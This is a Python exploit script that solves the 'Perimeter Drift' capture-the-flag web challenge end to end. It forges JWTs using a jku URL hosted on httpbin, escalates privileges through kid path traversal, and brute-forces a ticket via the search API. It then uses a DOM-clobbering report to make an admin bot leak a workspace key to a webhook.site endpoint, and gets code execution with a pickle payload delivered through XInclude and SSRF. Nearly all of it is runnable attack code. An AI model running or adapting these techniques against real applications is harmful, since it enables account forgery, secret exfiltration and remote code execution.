#!/usr/bin/env python3
"""
Perimeter Drift CTF - Full Solve v2
"""
import base64
import hashlib
import hmac
import json
import re
import sys
import time
import urllib.parse

import requests

TARGET = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://chall.0xfun.org:22702"
HMAC_KEY = "mysecretkey"

BOT_TARGETS = ["http://web:5000", "http://host.docker.internal:5000", "http://localhost:5000"]


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_jwt(key, payload, header_extra=None):
    header = {"alg": "RS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    si = f"{h}.{p}".encode()
    k = key if isinstance(key, bytes) else key.encode()
    sig = hmac.new(k, si, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def make_jku_url():
    jwks = json.dumps({"keys": [{"kid": "partner-main", "k": HMAC_KEY}]})
    b64 = base64.b64encode(jwks.encode()).decode()
    return f"https://httpbin.org/base64/{urllib.parse.quote(b64, safe='')}"


def make_pickle_payload():
    return b"cos\nsystem\np0\n(S'cp /flag.txt /shared/loot/flag.txt'\np1\ntp2\nRp3\n."


def check_flag():
    try:
        r = requests.get(f"{TARGET}/recovery/latest", timeout=10)
        return r.text.strip()
    except:
        return ""


def sso_login(s):
    jku_url = make_jku_url()
    now = int(time.time())
    token = forge_jwt(HMAC_KEY, {
        "sub": "researcher", "email": "nora.vale@drift.com", "name": "Nora Vale",
        "iss": "https://sso.partner.local", "aud": "perimeter-drift-web",
        "exp": now + 3600, "iat": now
    }, {"kid": "partner-main", "jku": jku_url})
    s.get(f"{TARGET}/sso/callback", params={"id_token": token}, allow_redirects=True, timeout=30)
    r = s.get(f"{TARGET}/api/me", timeout=10)
    return r.json() if r.status_code == 200 else None


def escalate_reviewer(s):
    known_key = b"XKEY"
    files = {"file": ("x.pem", known_key, "application/octet-stream")}
    r = s.post(f"{TARGET}/review/material/upload", files=files, timeout=10)
    if r.status_code != 200:
        return False
    fname = r.json().get("filename", "x.pem")
    kid_name = fname.rsplit(".pem", 1)[0] if fname.endswith(".pem") else fname
    grant = forge_jwt(known_key, {"scope": "report:submit", "iat": int(time.time())},
                      {"kid": f"../review-materials/{kid_name}"})
    s.post(f"{TARGET}/review/escalate", data={"grant": grant}, allow_redirects=True, timeout=10)
    me = s.get(f"{TARGET}/api/me", timeout=10).json()
    return me.get("role") in ("reviewer", "admin")


def find_bootstrap_ticket(s):
    """Find the bootstrap ticket by searching keyword patterns"""
    # First find the bootstrap program
    r = s.get(f"{TARGET}/api/search", params={"q": "bootstrap"}, timeout=10)
    results = r.json()
    bootstrap_id = None
    for item in results:
        bootstrap_id = item["id"]
        print(f"    Bootstrap program: id={item['id']} title='{item['title']}'")
        break
    if not bootstrap_id:
        print("    Bootstrap program not found!")
        return None

    # Map all matching keywords to understand the keyword space
    print("    Mapping keywords...")
    matching = []
    # Try various prefixes that could be ticket format
    prefixes_to_try = [
        "bt-", "pd-", "tk-", "sk-", "pk-", "rk-", "bk-", "ak-",
        "bs-", "ps-", "rs-", "ds-",
        "key-", "tok-", "pin-",
    ]
    for prefix in prefixes_to_try:
        try:
            r = s.get(f"{TARGET}/api/search", params={"q": prefix}, timeout=10)
            if any(item.get("id") == bootstrap_id for item in r.json()):
                matching.append(prefix)
                print(f"      '{prefix}' -> MATCH")
        except:
            pass

    # Try all 2-char alphanumeric combos followed by dash
    if not matching:
        print("    Trying 2-char prefix patterns (XX-)...")
        import string
        for c1 in string.ascii_lowercase:
            for c2 in string.ascii_lowercase + string.digits:
                prefix = f"{c1}{c2}-"
                try:
                    r = s.get(f"{TARGET}/api/search", params={"q": prefix}, timeout=8)
                    if any(item.get("id") == bootstrap_id for item in r.json()):
                        matching.append(prefix)
                        print(f"      '{prefix}' -> MATCH!")
                        break
                except:
                    pass
            if matching:
                break

    # Try single-char searches to find any pattern
    if not matching:
        print("    Trying single-char keyword fishing...")
        import string
        for ch in string.ascii_lowercase + string.digits + "-_":
            try:
                r = s.get(f"{TARGET}/api/search", params={"q": ch}, timeout=8)
                results = r.json()
                # Only count if ONLY bootstrap program matches (to isolate keywords)
                if len(results) == 1 and results[0]["id"] == bootstrap_id:
                    print(f"      '{ch}' -> UNIQUE match for bootstrap!")
                    matching.append(ch)
            except:
                pass

    if not matching:
        print("    Could not identify ticket prefix pattern")
        # Try brute force approach - search for all 4-hex-digit patterns
        print("    Trying direct bt-XXXX brute force (256 batches)...")
        HEX = "0123456789abcdef"
        for c1 in HEX:
            for c2 in HEX:
                q = f"bt-{c1}{c2}"
                try:
                    r = s.get(f"{TARGET}/api/search", params={"q": q}, timeout=8)
                    if any(item.get("id") == bootstrap_id for item in r.json()):
                        print(f"      FOUND prefix: {q}")
                        # Now narrow down last 2 chars
                        for c3 in HEX:
                            for c4 in HEX:
                                ticket = f"bt-{c1}{c2}{c3}{c4}"
                                r2 = s.get(f"{TARGET}/api/search", params={"q": ticket}, timeout=8)
                                if any(item.get("id") == bootstrap_id for item in r2.json()):
                                    return ticket
                except:
                    pass
        return None

    # If we found a prefix, binary search the rest
    print(f"    Found matching prefixes: {matching}")
    prefix = matching[0]

    # If it's a 3-char prefix like "pd-", binary search 4 hex chars
    HEX = "0123456789abcdef"
    ticket = prefix
    for pos in range(4):
        found = False
        for ch in HEX:
            candidate = ticket + ch
            try:
                r = s.get(f"{TARGET}/api/search", params={"q": candidate}, timeout=10)
                if any(item.get("id") == bootstrap_id for item in r.json()):
                    ticket += ch
                    found = True
                    print(f"      Char {pos}: '{ch}' -> {ticket}")
                    break
            except:
                pass
        if not found:
            # Try uppercase and other chars
            for ch in "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
                candidate = ticket + ch
                try:
                    r = s.get(f"{TARGET}/api/search", params={"q": candidate}, timeout=10)
                    if any(item.get("id") == bootstrap_id for item in r.json()):
                        ticket += ch
                        found = True
                        print(f"      Char {pos}: '{ch}' -> {ticket}")
                        break
                except:
                    pass
        if not found:
            print(f"      Stopped at: {ticket}")
            break

    return ticket


def create_xss_report(s):
    body = '<form id="workspace-state"><input name="state" value=\'{"debug":true,"module":"ops/loader"}\'></form>'
    r = s.post(f"{TARGET}/reports/new", data={"title": "Assessment", "vuln_type": "XSS", "report": body},
               allow_redirects=True, timeout=10)
    m = re.search(r"/reports/(\d+)", r.url)
    return m.group(1) if m else "1"


def create_webhook():
    try:
        wr = requests.post("https://webhook.site/token", timeout=10)
        wh = wr.json()
        return wh["uuid"], f"https://webhook.site/{wh['uuid']}"
    except:
        return None, None


def poll_webhook(uuid, timeout_s=60):
    for i in range(timeout_s // 2):
        time.sleep(2)
        try:
            r = requests.get(f"https://webhook.site/token/{uuid}/requests", timeout=10)
            if r.status_code == 200:
                data = r.json()
                for req in data.get("data", []):
                    url_str = req.get("url", "")
                    query = req.get("query") or {}
                    if query.get("workspace_key"):
                        return query["workspace_key"]
                    m = re.search(r"workspace_key=([^&]+)", url_str)
                    if m:
                        return urllib.parse.unquote(m.group(1))
        except:
            pass
        if (i + 1) % 5 == 0:
            print(f"    Waiting... ({(i+1)*2}s)")
    return None


def do_rce(workspace_key):
    b64_payload = base64.b64encode(make_pickle_payload()).decode()
    files = {"file": ("payload.b64", b64_payload, "text/plain")}
    r = requests.post(f"{TARGET}/admin/upload", files=files,
                      headers={"X-Workspace-Key": workspace_key}, timeout=10)
    print(f"    Upload: {r.status_code} {r.text}")

    xml = ('<doc sink="http://internal:9000/internal/import" '
           'xmlns:drift="http://www.w3.org/2001/XInclude">'
           '<drift:include href="file:///var/app/uploads/payload.b64" parse="text"/></doc>')
    r = requests.post(f"{TARGET}/admin/xml/import", data={"xml": xml},
                      headers={"X-Workspace-Key": workspace_key}, timeout=10)
    print(f"    XML import: {r.status_code} {r.text}")


def solve():
    print(f"Target: {TARGET}")
    print("=" * 60)

    flag = check_flag()
    if "0xfun{" in flag:
        print(f"\nFLAG: {flag}")
        return

    # Step 1: SSO login
    print("\n[1] SSO JWT Forgery...")
    s = requests.Session()
    me = sso_login(s)
    if not me:
        print("    FAILED")
        return
    print(f"    -> {me['username']} ({me['role']})")

    # Step 2: Reviewer escalation
    print("\n[2] Reviewer escalation...")
    if me.get("role") == "researcher":
        if not escalate_reviewer(s):
            print("    FAILED")
            return
    me = s.get(f"{TARGET}/api/me", timeout=10).json()
    print(f"    -> role: {me['role']}")

    # Step 3: Find bootstrap ticket
    print("\n[3] Finding bootstrap ticket...")
    ticket = find_bootstrap_ticket(s)
    if not ticket:
        print("    FAILED - could not find ticket")
        print("    Try providing ticket manually: python solve_v2.py URL --ticket bt-XXXX")
        return
    print(f"    -> Bootstrap ticket: {ticket}")

    # Step 4: Create XSS report
    print("\n[4] Creating DOM clobber report...")
    rid = create_xss_report(s)
    print(f"    Report ID: {rid}")

    # Step 5: Create webhook
    print("\n[5] Setting up webhook...")
    wh_uuid, wh_url = create_webhook()
    if not wh_url:
        print("    FAILED")
        return
    print(f"    {wh_url}")

    # Step 6: Submit bot URLs
    print("\n[6] Submitting bot URLs...")
    for tb in BOT_TARGETS:
        url = (f"{tb}/reports/{rid}"
               f"?view=../../assets/admin/roles"
               f"&ticket={urllib.parse.quote(ticket)}"
               f"&cb={urllib.parse.quote(wh_url, safe='')}")
        try:
            s.post(f"{TARGET}/report", data={"url": url}, allow_redirects=True, timeout=15)
            print(f"    [{tb}] queued")
        except Exception as e:
            print(f"    [{tb}] {e}")

    # Step 7: Poll webhook
    print(f"\n[7] Polling webhook (90s)...")
    wk = poll_webhook(wh_uuid, 90)

    if wk:
        print(f"\n[+] workspace_key: {wk}")
        print("\n[8] Pickle RCE...")
        do_rce(wk)
        time.sleep(3)
        flag = check_flag()
        print(f"\n{'='*60}")
        print(f"FLAG: {flag}")
        print(f"{'='*60}")
        return

    print("\n[-] No workspace_key. Debug:")
    try:
        r = requests.get(f"https://webhook.site/token/{wh_uuid}/requests", timeout=10)
        data = r.json()
        print(f"    Webhook requests: {data.get('total', 0)}")
        for req in data.get("data", []):
            print(f"    {req.get('method')} {req.get('url')}")
            print(f"    Query: {req.get('query')}")
    except Exception as e:
        print(f"    {e}")

    flag = check_flag()
    print(f"\nRecovery: {flag}")


if __name__ == "__main__":
    # Support --ticket argument
    if "--ticket" in sys.argv:
        idx = sys.argv.index("--ticket")
        manual_ticket = sys.argv[idx + 1]
        sys.argv.pop(idx)
        sys.argv.pop(idx)
        # Override find_bootstrap_ticket
        original_find = find_bootstrap_ticket
        find_bootstrap_ticket = lambda s: manual_ticket
    solve()
